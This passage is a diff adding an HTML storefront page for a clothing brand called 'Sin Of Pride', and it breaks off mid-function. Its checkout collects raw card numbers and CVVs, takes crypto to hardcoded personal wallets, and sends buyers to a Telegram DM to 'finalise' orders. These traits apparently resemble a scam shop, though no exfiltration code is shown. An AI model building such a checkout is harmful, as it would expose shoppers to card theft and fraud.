@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sin Of Pride - Official Store</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=Great+Vibes&family=Inter:wght@200;300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        cursive: ['Great Vibes', 'cursive'],
+                        serif: ['Cinzel', 'serif'],
+                    },
+                    letterSpacing: {
+                        widest: '.2em',
+                        mega: '.3em',
+                        ultra: '.4em',
+                        luxury: '.5em',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            overflow-x: hidden;
+            
+            &::-webkit-scrollbar {
+                display: none;
+            }
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        html {
+            overflow-y: scroll;
+            scrollbar-width: none;
+        }
+        html::-webkit-scrollbar {
+            display: none;
+        }
+
+        input, textarea {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+        .brand-title {
+            font-family: 'Great Vibes', cursive;
+            font-weight: 400;
+            letter-spacing: 0.05em;
+            font-size: 1.8rem;
+        }
+
+        #site-header {
+            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        #site-header.header-hidden {
+            transform: translateY(-100%);
+        }
+
+        @keyframes swipeUpSite {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .animate-swipe-up {
+            animation: swipeUpSite 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        @keyframes slideUpFade {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .animate-slide-up {
+            animation: slideUpFade 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-full animate-swipe-up bg-[#0a0a0a] text-white dark:bg-[#0a0a0a] dark:text-white transition-colors duration-300">
+
+    <header id="site-header" class="sticky top-0 z-50 border-b border-neutral-900 bg-[#0a0a0a] text-white transition-colors duration-300">
+        <div class="max-w-[1920px] mx-auto px-6 h-16 flex items-center justify-between relative">
+            
+            <nav class="hidden lg:flex items-center space-x-7 text-xs tracking-widest font-light">
+                <a href="#" onclick="showShop()" class="hover:text-neutral-400 transition-colors duration-200">NEW</a>
+                <a href="#" onclick="showShop()" class="hover:text-neutral-400 transition-colors duration-200">SHOP</a>
+            </nav>
+
+            <button id="mobile-menu-btn" class="lg:hidden text-lg p-2 focus:outline-none transition-transform duration-200 active:scale-95" aria-label="Toggle Menu">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+
+            <div class="absolute left-1/2 transform -translate-x-1/2 text-center">
+                <a href="#" onclick="showShop()" class="brand-title hover:opacity-75 transition-opacity duration-200 whitespace-nowrap">
+                    Sin of Pride
+                </a>
+            </div>
+
+            <div class="flex items-center space-x-5 text-xs">
+                <button onclick="toggleTheme()" class="hover:opacity-75 transition-opacity duration-200 p-1" aria-label="Toggle Theme" id="theme-toggle-btn">
+                    <i class="fa-solid fa-moon text-sm"></i>
+                </button>
+                <a href="#login" onclick="openModal('login')" class="hidden sm:inline-block text-xs tracking-widest font-light hover:opacity-75 transition-opacity duration-200">LOGIN</a>
+                <a href="#wishlist" class="hover:opacity-75 transition-opacity duration-200 relative group" aria-label="Wishlist" onclick="openWishlist()">
+                    <i class="fa-regular fa-heart text-base font-light transition-transform duration-200 group-hover:scale-110"></i>
+                    <span id="wishlist-count" class="absolute -top-1 -right-2 bg-white text-black text-[9px] w-4 h-4 rounded-full flex items-center justify-center font-bold">0</span>
+                </a>
+                <button onclick="toggleCart()" class="hover:opacity-75 transition-opacity duration-200 relative group flex items-center justify-center w-6 h-6" aria-label="Shopping Bag">
+                    <img id="cart-icon-img" src="https://cdn.discordapp.com/emojis/810828604417507340.gif" alt="Bag" class="w-5 h-5 object-contain transition-transform duration-200 group-hover:scale-110">
+                    <span id="cart-count" class="absolute -top-1 -right-2 bg-white text-black text-[9px] w-4 h-4 rounded-full flex items-center justify-center font-bold shadow-sm">0</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="border-t border-neutral-900 bg-[#0a0a0a] px-6 py-2.5 transition-colors duration-300" id="search-bar-container">
+            <div class="max-w-[1920px] mx-auto flex items-center space-x-3 text-xs text-neutral-400">
+                <i class="fa-solid fa-magnifying-glass text-neutral-500 text-sm"></i>
+                <input type="text" id="site-search-input" placeholder="SEARCH PRODUCTS..." onkeypress="handleSearchInput(event)" class="w-full bg-transparent uppercase tracking-widest placeholder-neutral-500 focus:outline-none font-light text-xs">
+            </div>
+        </div>
+    </header>
+
+    <div id="mobile-menu" class="fixed inset-0 z-50 bg-[#0a0a0a] text-white transform translate-x-full transition-transform duration-300 ease-in-out lg:hidden flex flex-col">
+        <div class="flex items-center justify-between p-6 border-b border-neutral-900">
+            <span class="brand-title text-xl">Sin of Pride</span>
+            <button id="mobile-menu-close" class="text-lg p-2 transition-transform duration-200 active:scale-95"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="flex flex-col space-y-6 p-8 text-sm font-light tracking-widest">
+            <a href="#" onclick="closeMobileMenu(); showShop();" class="hover:text-neutral-400 transition-colors">NEW</a>
+            <a href="#" onclick="closeMobileMenu(); showShop();" class="hover:text-neutral-400 transition-colors">SHOP</a>
+            <hr class="border-neutral-900 my-3">
+            <a href="#login" onclick="closeMobileMenu(); openModal('login');" class="text-xs">LOGIN</a>
+        </div>
+    </div>
+
+    <main id="main-content" class="flex-1 flex flex-col">
+        
+        <!-- Shop Catalogue View -->
+        <div id="page-shop" class="flex-1 flex flex-col py-16 px-6 max-w-[1400px] mx-auto w-full animate-slide-up">
+            <div class="mb-8 flex items-center justify-between border-b border-neutral-800 pb-4">
+                <button onclick="showNotification('You are already on the Fall Collection catalogue')" class="text-xs tracking-widest text-neutral-400 hover:opacity-75 flex items-center space-x-2 transition-opacity duration-200" aria-label="Back">
+                    <i class="fa-solid fa-arrow-left transition-transform duration-200 hover:-translate-x-1 text-sm"></i>
+                </button>
+                <span class="text-[11px] tracking-mega text-neutral-500 uppercase font-light">CATALOGUE</span>
+            </div>
+
+            <div class="text-center mb-8">
+                <h2 class="text-2xl sm:text-3xl font-serif font-light tracking-widest uppercase">FALL COLLECTION</h2>
+                
+                <div id="category-filters" class="flex flex-wrap justify-center gap-2 sm:gap-3 mt-6 text-xs uppercase tracking-widest">
+                    <button onclick="filterCategory('ALL')" data-category="ALL" class="cat-btn px-6 py-2.5 rounded-none border border-neutral-800 transition-all duration-200 font-medium">ALL</button>
+                    <button onclick="filterCategory('TOPS')" data-category="TOPS" class="cat-btn px-6 py-2.5 rounded-none border border-neutral-800 transition-all duration-200">TOPS</button>
+                    <button onclick="filterCategory('BOTTOMS')" data-category="BOTTOMS" class="cat-btn px-6 py-2.5 rounded-none border border-neutral-800 transition-all duration-200">BOTTOMS</button>
+                    <button onclick="filterCategory('MORE')" data-category="MORE" class="cat-btn px-6 py-2.5 rounded-none border border-neutral-800 transition-all duration-200">MORE</button>
+                </div>
+            </div>
+
+            <div id="products-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Injected via JavaScript -->
+            </div>
+        </div>
+
+        <!-- Product Details View -->
+        <div id="page-product-detail" class="flex-1 flex flex-col hidden py-12 px-6 max-w-[1200px] mx-auto w-full animate-slide-up">
+            <div class="mb-8">
+                <button onclick="showShop()" class="text-xs tracking-widest text-neutral-400 hover:opacity-75 flex items-center space-x-2 transition-opacity duration-200" aria-label="Back to catalogue">
+                    <i class="fa-solid fa-arrow-left transition-transform duration-200 hover:-translate-x-1 text-sm"></i>
+                </button>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-start">
+                <div class="space-y-4">
+                    <div id="detail-img-wrapper" class="w-full h-[500px] bg-neutral-900/50 border border-neutral-800 rounded-none overflow-hidden flex items-center justify-center p-4 shadow-sm transition-colors duration-300">
+                        <img id="detail-active-img" src="" class="w-full h-full object-contain pointer-events-none transition-all duration-500 ease-out">
+                    </div>
+                    <div id="detail-thumbnails" class="flex space-x-3 justify-center">
+                        <!-- Thumbnails injected via JS -->
+                    </div>
+                </div>
+
+                <div class="flex flex-col space-y-6 pt-4">
+                    <div>
+                        <h1 id="detail-title" class="text-xl sm:text-2xl font-bold uppercase tracking-widest font-serif"></h1>
+                        <p id="detail-price" class="text-sm font-semibold tracking-wider mt-2"></p>
+                    </div>
+                    <p class="text-xs text-neutral-400 uppercase tracking-widest font-light">Material: <span id="detail-material">Cotton</span></p>
+                    
+                    <div class="pt-6 border-t border-neutral-800">
+                        <button id="detail-add-btn" onclick="addCurrentProductToCart()" class="w-full bg-white text-black text-xs uppercase tracking-widest py-4 transition-all duration-200 active:scale-95 font-normal shadow-sm hover:opacity-90 rounded-none">
+                            ADD TO BAG
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Checkout View -->
+        <div id="page-checkout" class="flex-1 flex flex-col hidden py-12 px-6 max-w-[1300px] mx-auto w-full animate-slide-up">
+            <div class="mb-8 flex items-center justify-between border-b border-neutral-800 pb-4">
+                <button onclick="toggleCart()" class="text-xs tracking-widest text-neutral-400 hover:opacity-75 flex items-center space-x-2 transition-opacity duration-200" aria-label="Back">
+                    <i class="fa-solid fa-arrow-left transition-transform duration-200 hover:-translate-x-1 text-sm"></i>
+                    <span>RETURN TO BAG</span>
+                </button>
+                <span class="text-[11px] tracking-mega text-neutral-500 uppercase font-light">SECURE CHECKOUT</span>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-10 items-start">
+                <div class="lg:col-span-5 bg-[#0e0e0e] border border-neutral-800/80 p-8 space-y-6">
+                    <div class="flex justify-between items-center pb-4 border-b border-neutral-800">
+                        <span class="text-xs font-bold tracking-widest uppercase text-white">SUMMARY</span>
+                        <span id="checkout-summary-total-top" class="text-xs font-bold text-white">$49.99 USD</span>
+                    </div>
+
+                    <div class="space-y-2 border-b border-neutral-800/60 pb-4">
+                        <span class="block text-[10px] text-neutral-400 uppercase tracking-wider font-light">DISCOUNT CODE</span>
+                        <div class="flex space-x-2">
+                            <input type="text" id="coupon-input" placeholder="ENTER CODE" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-3 py-2 focus:outline-none focus:border-blue-500 uppercase placeholder-neutral-600">
+                            <button type="button" onclick="applyCoupon()" class="bg-neutral-800 hover:bg-neutral-700 text-white text-[10px] px-4 tracking-widest uppercase font-medium transition-colors">APPLY</button>
+                        </div>
+                        <span id="coupon-message" class="text-[10px] text-green-400 hidden">Coupon applied! Order is free.</span>
+                    </div>
+
+                    <div class="flex justify-between items-center pt-2 text-xs font-bold uppercase tracking-widest text-white">
+                        <span>TOTAL</span>
+                        <span id="checkout-summary-total" class="text-blue-500 font-bold">$49.99 USD</span>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-7 bg-[#121212] border border-neutral-800 p-8 shadow-2xl relative">
+                    <h3 class="text-sm font-bold tracking-widest uppercase mb-6 text-white">CHECKOUT</h3>
+
+                    <form id="exact-checkout-form" onsubmit="handleCheckoutFormSubmit(event)" class="space-y-5">
+                        <div>
+                            <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-1.5 font-light">Delivery Information</label>
+                            <input type="email" id="checkout-email" required placeholder="customer@gmail.com" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-500">
+                        </div>
+
+                        <!-- Payment Choice: Card or Crypto -->
+                        <div>
+                            <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-2 font-light">Payment Choice</label>
+                            <div class="grid grid-cols-2 gap-3">
+                                <button type="button" onclick="selectPaymentTypeChoice('card')" id="pt-card" class="payment-choice-btn border border-blue-600 bg-[#161b22] p-3 text-center text-white text-xs font-semibold tracking-wider uppercase transition-all">Card</button>
+                                <button type="button" onclick="selectPaymentTypeChoice('crypto')" id="pt-crypto" class="payment-choice-btn border border-neutral-700 bg-[#181818] p-3 text-center text-neutral-300 text-xs font-semibold tracking-wider uppercase transition-all">Crypto</button>
+                            </div>
+                        </div>
+
+                        <!-- Crypto Coin Selector (Shown if Crypto is selected) -->
+                        <div id="crypto-coin-container" class="space-y-3 hidden bg-[#181818] border border-neutral-700/80 p-4">
+                            <!-- Red warning pop-up note reminding to fill in delivery info first -->
+                            <div id="crypto-delivery-warning" class="bg-red-950/40 border border-red-500/60 p-3 text-red-400 text-[11px] font-semibold tracking-wide uppercase flex items-start space-x-2">
+                                <i class="fa-solid fa-triangle-exclamation text-red-500 text-sm mt-0.5"></i>
+                                <span>Warning: Please make sure to fill in your delivery information completely BEFORE paying with crypto!</span>
+                            </div>
+
+                            <label class="block text-[10px] uppercase tracking-widest text-blue-400 font-semibold">Select Cryptocurrency</label>
+                            <div class="grid grid-cols-4 gap-2">
+                                <button type="button" onclick="selectCryptoCoin('btc')" id="coin-btc" class="coin-tab border border-blue-600 bg-[#121212] p-2.5 text-center text-white text-[11px] font-medium tracking-wider transition-all">BTC</button>
+                                <button type="button" onclick="selectCryptoCoin('eth')" id="coin-eth" class="coin-tab border border-neutral-700 bg-[#181818] p-2.5 text-center text-neutral-300 text-[11px] font-medium tracking-wider transition-all">ETH</button>
+                                <button type="button" onclick="selectCryptoCoin('sol')" id="coin-sol" class="coin-tab border border-neutral-700 bg-[#181818] p-2.5 text-center text-neutral-300 text-[11px] font-medium tracking-wider transition-all">SOL</button>
+                                <button type="button" onclick="selectCryptoCoin('ltc')" id="coin-ltc" class="coin-tab border border-neutral-700 bg-[#181818] p-2.5 text-center text-neutral-300 text-[11px] font-medium tracking-wider transition-all">LTC</button>
+                            </div>
+
+                            <div class="space-y-2 pt-2">
+                                <div class="flex justify-between items-center">
+                                    <span class="text-[10px] text-neutral-400 uppercase tracking-wider font-light">Amount to send:</span>
+                                    <span id="crypto-amount-display" class="text-xs font-mono font-bold text-amber-400">0.00085 BTC</span>
+                                </div>
+                                <span class="block text-[10px] uppercase tracking-widest text-neutral-400 font-light" id="crypto-address-label">BITCOIN ADDRESS</span>
+                                <div class="flex items-center space-x-2">
+                                    <input type="text" id="crypto-address-input" readonly class="w-full bg-[#121212] border border-neutral-700 text-white font-mono text-[11px] px-3 py-2.5 focus:outline-none select-all">
+                                    <button type="button" onclick="copyCryptoAddress()" class="bg-blue-600 hover:bg-blue-500 text-white text-[10px] px-4 py-2.5 uppercase tracking-wider font-medium transition-colors whitespace-nowrap">COPY</button>
+                                </div>
+                                <p class="text-[10px] text-amber-400 font-medium leading-relaxed bg-amber-950/30 border border-amber-800/50 p-2.5 mt-2">
+                                    <i class="fa-solid fa-circle-info mr-1"></i> Note: Send the exact amount shown above to the address. This crypto payment will complete automatically once detected on the network!
+                                </p>
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-1.5 font-light">Full Name</label>
+                            <input type="text" id="checkout-name" required placeholder="John Doe" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600">
+                        </div>
+
+                        <div class="space-y-4">
+                            <label class="block text-[10px] uppercase tracking-widest text-neutral-400 font-light">Shipping Address</label>
+                            <div>
+                                <input type="text" id="checkout-street" required placeholder="Street Address (e.g. 123 Main St)" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600">
+                            </div>
+                            <div class="grid grid-cols-2 gap-4">
+                                <input type="text" id="checkout-city" required placeholder="City" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600">
+                                <input type="text" id="checkout-state" required placeholder="State (e.g. LA)" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600">
+                            </div>
+                        </div>
+
+                        <!-- Card Fields Container -->
+                        <div id="card-fields-container" class="space-y-5">
+                            <div>
+                                <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-1.5 font-light">Card Number</label>
+                                <input type="text" id="checkout-card" placeholder="4532 •••• •••• ••••" maxlength="19" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600 font-mono tracking-wider">
+                            </div>
+
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-1.5 font-light">Expiration Date</label>
+                                    <input type="text" id="checkout-expiry" placeholder="MM/YY" maxlength="5" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600 font-mono">
+                                </div>
+                                <div>
+                                    <label class="block text-[10px] uppercase tracking-widest text-neutral-400 mb-1.5 font-light">CVV</label>
+                                    <input type="password" id="checkout-cvv" placeholder="123" maxlength="4" class="w-full bg-[#181818] border border-neutral-700/80 text-white text-xs px-4 py-3 focus:outline-none focus:border-blue-500 transition-colors placeholder-neutral-600 font-mono tracking-widest">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pt-2 border-t border-neutral-800 space-y-3">
+                            <span class="block text-[10px] uppercase tracking-widest text-neutral-400 font-light">Before you pay</span>
+                            <p class="text-[11px] text-neutral-400 font-light leading-relaxed">Please review and accept the following to continue with your purchase.</p>
+                            
+                            <label class="flex items-start space-x-3 cursor-pointer">
+                                <input type="checkbox" required class="mt-0.5 accent-blue-600">
+                                <span class="text-[11px] text-neutral-300 font-light">I agree to the terms of service and refund policy</span>
+                            </label>
+                        </div>
+
+                        <!-- Complete Payment Button (Only shown for Card / Free coupon, hidden for Crypto since crypto completes automatically) -->
+                        <div class="pt-4" id="complete-payment-btn-wrapper">
+                            <button type="submit" id="pay-submit-btn" class="w-full bg-[#2563eb] hover:bg-blue-600 text-white text-xs uppercase font-medium tracking-widest py-4 transition-all duration-200 active:scale-95 shadow-md flex items-center justify-center space-x-2 rounded-none">
+                                <span id="pay-btn-text">COMPLETE PAYMENT</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- Payment Declined View -->
+        <div id="page-payment-declined" class="flex-1 flex flex-col hidden items-center justify-center py-20 px-6 max-w-[800px] mx-auto w-full text-center animate-slide-up">
+            <div class="bg-[#121212] border border-red-800 p-10 w-full shadow-2xl space-y-6">
+                <div class="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center mx-auto text-red-500 text-2xl">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                </div>
+                <div>
+                    <h2 class="text-xl font-bold uppercase tracking-widest text-red-500">PAYMENT DECLINED</h2>
+                    <p id="declined-reason" class="text-xs text-neutral-400 uppercase tracking-widest mt-2 font-light">Your payment could not be processed due to invalid or suspicious information.</p>
+                </div>
+                <div class="pt-4 border-t border-neutral-800">
+                    <button onclick="goToCheckout()" class="bg-white text-black hover:bg-neutral-200 text-xs uppercase tracking-widest px-8 py-3.5 transition-all font-medium">RETURN TO CHECKOUT</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Order Success View -->
+        <div id="page-order-success" class="flex-1 flex flex-col hidden items-center justify-center py-20 px-6 max-w-[800px] mx-auto w-full text-center animate-slide-up">
+            <div class="bg-[#121212] border border-neutral-800 p-10 w-full shadow-2xl space-y-6">
+                <div class="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center mx-auto text-blue-500 text-2xl">
+                    <i class="fa-solid fa-rotate"></i>
+                </div>
+                <div>
+                    <h2 class="text-xl font-bold uppercase tracking-widest text-white">ORDER PENDING</h2>
+                    <p class="text-xs text-neutral-400 uppercase tracking-widest mt-2 font-light">Your order is currently awaiting confirmation.</p>
+                </div>
+
+                <div class="bg-[#181818] border border-neutral-800 p-6 my-6 space-y-3">
+                    <span class="block text-[10px] text-neutral-400 uppercase tracking-widest font-light">YOUR CUSTOM CODE</span>
+                    <div id="success-custom-code" class="text-lg font-mono font-bold tracking-wider text-blue-500 select-all">SOP-9982-PAID</div>
+                </div>
+
+                <p class="text-xs text-neutral-300 font-light">To finalize your order, please DM me on Telegram with your custom code above:</p>
+
+                <div>
+                    <a href="https://t.me/Antykhryst" target="_blank" class="inline-flex items-center justify-center space-x-2 bg-[#2563eb] hover:bg-blue-600 text-white text-xs font-medium tracking-widest px-6 py-4 uppercase transition-all duration-200 active:scale-95 shadow-md rounded-none">
+                        <i class="fa-brands fa-telegram text-base"></i>
+                        <span>DM @Antykhryst ON TELEGRAM</span>
+                    </a>
+                </div>
+
+                <div class="pt-4 border-t border-neutral-800">
+                    <button onclick="showShop()" class="text-xs text-neutral-400 hover:text-white uppercase tracking-widest transition-colors font-light">Return to Store</button>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <div id="cart-drawer" class="fixed inset-0 z-50 overflow-hidden hidden">
+        <div id="cart-backdrop" class="absolute inset-0 bg-black/70 backdrop-blur-sm transition-opacity duration-300 opacity-0" onclick="toggleCart()"></div>
+        <div id="cart-panel" class="absolute inset-y-0 right-0 max-w-full flex pl-10 transform translate-x-full transition-transform duration-300 ease-in-out">
+            <div id="cart-panel-box" class="w-screen max-w-md bg-[#0a0a0a] text-white shadow-2xl flex flex-col text-xs border-l border-neutral-900 transition-colors duration-300">
+                <div class="flex items-center justify-between p-6 border-b border-neutral-900">
+                    <span class="text-xs font-semibold tracking-mega uppercase">BAG (<span id="cart-items-count">0</span>)</span>
+                    <button onclick="toggleCart()" class="text-lg p-2 transition-transform duration-200 active:scale-95"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+                <div id="cart-items-container" class="flex-1 overflow-y-auto p-6 space-y-6">
+                    <div class="text-center py-20 text-neutral-500 text-xs uppercase tracking-widest font-light">
+                        YOUR BAG IS EMPTY
+                    </div>
+                </div>
+                <div id="cart-footer" class="p-6 border-t border-neutral-900 bg-[#0a0a0a] transition-colors duration-300">
+                    <div class="flex justify-between text-xs font-bold uppercase tracking-widest mb-3">
+                        <span>TOTAL</span>
+                        <span id="cart-subtotal">$0</span>
+                    </div>
+                    <button id="checkout-btn" onclick="goToCheckout()" class="w-full bg-white text-black text-xs uppercase font-normal tracking-widest py-4 hover:opacity-90 transition-all duration-200 active:scale-95 shadow-md rounded-none">
+                        CHECKOUT
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="generic-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
+        <div id="modal-backdrop" class="absolute inset-0 bg-black/70 backdrop-blur-sm transition-opacity duration-300 opacity-0" onclick="closeModal()"></div>
+        <div id="modal-content-box" class="relative bg-[#0a0a0a] text-white w-full max-w-md rounded-none shadow-2xl p-8 z-10 text-xs transform scale-95 opacity-0 transition-all duration-300 ease-out border border-neutral-900">
+            <div class="flex justify-between items-center mb-6 border-b border-neutral-900 pb-3" id="modal-header-border">
+                <h3 id="modal-title" class="text-xs font-bold uppercase tracking-mega">NOTICE</h3>
+                <button onclick="closeModal()" class="text-sm transition-transform duration-200 active:scale-95"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div id="modal-body" class="text-xs uppercase tracking-widest leading-relaxed font-light"></div>
+        </div>
+    </div>
+
+    <script>
+        let cart = [];
+        let wishlist = JSON.parse(localStorage.getItem('sop_wishlist')) || [];
+        let currentProduct = null;
+        let currentCategory = 'ALL';
+        let isDarkMode = true;
+        let isFreeOrder = false;
+        let selectedPaymentTypeChoiceVal = 'card'; // 'card' or 'crypto'
+        let selectedCryptoCoinVal = 'btc';
+
+        const cryptoAddresses = {
+            btc: 'bc1qluqk0tlugstvmla0wqw5sgy2q5wyawqchpzpxv',
+            eth: '0xF25B2121DfbD1A6835e977532fFfa1Da4d57Cb22',
+            sol: '3NAJCAA67S7RF8BgHt8KTLzcLfUJ3PN6BCNkKDVuPXWX',
+            ltc: 'LV22vJ4yJUzGddnPvj3PgeFyoDAQU2Yysp'
+        };
+
+        const cryptoRates = {
+            btc: 64000,
+            eth: 3500,
+            sol: 150,
+            ltc: 75
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const cardInput = document.getElementById('checkout-card');
+            if (cardInput) {
+                cardInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    let formattedValue = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                        formattedValue += value[i];
+                    }
+                    e.target.value = formattedValue.substring(0, 19);
+                });
+            }
+
+            const expiryInput = document.getElementById('checkout-expiry');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    } else {
+                        e.target.value = value;
+                    }
+                });
+            }
+        });
+
+        function selectPaymentTypeChoice(type) {
+            selectedPaymentTypeChoiceVal = type;
+            const btnCard = document.getElementById('pt-card');
+            const btnCrypto = document.getElementById('pt-crypto');
+            const cardFields = document.getElementById('card-fields-container');
+            const cryptoContainer = document.getElementById('crypto-coin-container');
+            const completeBtnWrapper = document.getElementById('complete-payment-btn-wrapper');
+
+            if (type === 'card') {
+                btnCard.className = 'payment-choice-btn border border-blue-600 bg-[#161b22] p-3 text-center text-white text-xs font-semibold tracking-wider uppercase transition-all';
+                btnCrypto.className = 'payment-choice-btn border border-neutral-700 bg-[#181818] p-3 text-center text-neutral-300 text-xs font-semibold tracking-wider uppercase transition-all';
+                
+                cryptoContainer.classList.add('hidden');
+                completeBtnWrapper.classList.remove('hidden');
+
+                if (!isFreeOrder) {
+                    cardFields.classList.remove('hidden');
+                    document.getElementById('checkout-card').required = true;
+                    document.getElementById('checkout-expiry').required = true;
+                    document.getElementById('checkout-cvv').required = true;
+                }
+            } else {
+                btnCrypto.className = 'payment-choice-btn border border-blue-600 bg-[#161b22] p-3 text-center text-white text-xs font-semibold tracking-wider uppercase transition-all';
+                btnCard.className = 'payment-choice-btn border border-neutral-700 bg-[#181818] p-3 text-center text-neutral-300 text-xs font-semibold tracking-wider uppercase transition-all';
+
+                cardFields.classList.add('hidden');
+                document.getElementById('checkout-card').required = false;
+                document.getElementById('checkout-expiry').required = false;
+                document.getElementById('checkout-cvv').required = false;
+
+                // Crypto selected -> NO COMPLETE PAYMENT BUTTON, completes automatically
+                completeBtnWrapper.classList.add('hidden');
+                cryptoContainer.classList.remove('hidden');
+                selectCryptoCoin(selectedCryptoCoinVal);
+            }
+        }
+
+        function selectCryptoCoin(coin) {
+            selectedCryptoCoinVal = coin;
+            const coins = ['btc', 'eth', 'sol', 'ltc'];
+            coins.forEach(c => {
+                const btn = document.getElementById(`coin-${c}`);
+                if (c === coin) {
+                    btn.className = 'coin-tab border border-blue-600 bg-[#121212] p-2.5 text-center text-white text-[11px] font-medium tracking-wider transition-all';
+                } else {
+                    btn.className = 'coin-tab border border-neutral-700 bg-[#181818] p-2.5 text-center text-neutral-300 text-[11px] font-medium tracking-wider transition-all';
+                }
+            });
+
+            document.getElementById('crypto-address-label').innerText = `${coin.toUpperCase()} PAYMENT ADDRESS`;
+            document.getElementById('crypto-address-input').value = cryptoAddresses[coin];
+
+            // Calculate exact amount based on total cart value
+            const totalUSD = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0) || 49.99;
+            const rate = cryptoRates[coin] || 1;
+            const cryptoAmount = (totalUSD / rate).toFixed(6);
+            document.getElementById('crypto-amount-display').innerText = `${cryptoAmount} ${coin.toUpperCase()}`;
+        }
+
+        function copyCryptoAddress() {
+            const input = document.getElementById('crypto-address-input');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value);
+            showNotification('Crypto address copied to clipboard');
+        }
+
+        function applyThemeStyles() {
+            const body = document.body;
+            const header = document.getElementById('site-header');
+            const searchBar = document.getElementById('search-bar-container');
+            const cartDrawerBox = document.getElementById('cart-panel-box');
+            const cartFooter = document.getElementById('cart-footer');
+            const modalBox = document.getElementById('modal-content-box');
+            const modalHeader = document.getElementById('modal-header-border');
+            const themeBtn = document.getElementById('theme-toggle-btn').querySelector('i');
+            const cartIcon = document.getElementById('cart-icon-img');
+            const detailImgWrapper = document.getElementById('detail-img-wrapper');
+            const detailAddBtn = document.getElementById('detail-add-btn');
+            const checkoutBtn = document.getElementById('checkout-btn');
+
+            if (isDarkMode) {
+                body.style.backgroundColor = '#0a0a0a';
+                body.style.color = '#ffffff';
+                header.className = 'sticky top-0 z-50 border-b border-neutral-900 bg-[#0a0a0a] text-white transition-colors duration-300';
